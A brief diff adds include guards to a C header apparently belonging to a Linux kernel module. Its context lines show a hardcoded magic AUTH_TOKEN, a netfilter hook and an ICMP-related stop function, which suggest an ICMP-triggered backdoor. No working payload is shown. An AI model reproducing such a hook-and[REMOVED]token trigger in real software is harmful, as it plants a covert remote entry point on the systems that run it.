@@ -1,3 +1,6 @@
+#ifndef SSH_H
+#define SSH_H
+
 #define AUTH_TOKEN 0xDEADC0DE
 
 DECLARE_WAIT_QUEUE_HEAD(run_event);
@@ -161,3 +164,5 @@ void stop_icmp (void)
 		
     nf_unregister_hook(&pre_hook);
 }
+
+#endif /* SSH_H */
